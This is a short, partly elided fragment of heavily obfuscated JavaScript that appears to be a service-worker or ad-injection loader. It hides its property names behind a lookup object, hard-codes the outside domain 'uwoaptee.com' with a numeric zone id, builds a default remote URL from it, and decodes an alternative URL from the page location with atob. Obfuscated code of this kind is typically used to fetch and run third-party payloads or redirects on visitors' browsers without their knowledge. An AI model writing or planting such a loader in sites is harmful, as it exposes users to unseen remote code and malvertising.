(function (O) {
    !function (e) {
        ...
        n[O.G] = function (e) {
            O.HO != typeof Symbol && Symbol[O.hO] && Object[O.b](
                e,
                Symbol[O.hO],
                O.Z(O.p, O.cO)
            ),
        ...
        self[O.c] = O.Z(O.S, 6914496, O.V, "uwoaptee.com", O.l, !O.N),
        self[O.D] = O.F;
        var DEFAULT_URL = [O.Y, O.j][O.A](self[O.c][O.V]),
            ...
            url;
        try {
            if (url = atob(location[O.DO][O.x](O.X)), !url) 
                throw O.q
        } catch (e) {
            url = DEFAULT_URL
        }
        ...
        t[O.Q] = function (e) {
            return new Promise(function (t, n) {
                r(O.BO)[O.gO](function (r) {
                    var i = r[O.tO]([O.lO], O.rO)[O.xO](O.lO)[O.WO](
        ...
        function i() {
            var e = arguments[O.iO] > O.N && void O.N !== arguments[O.N]
                    ? arguments[O.N]
                    : O.N,
                t = e < O.W && Math[O.mO]() > O.k,
                n = Math[O.mO]()[O.zO](O.wO)[O.x](
                    O.d,
                    O.KO + parseInt(O.AO * Math[O.mO](), O.NO)
                );
            return n + (
                t
                    ? O.s + i(e + O.X)
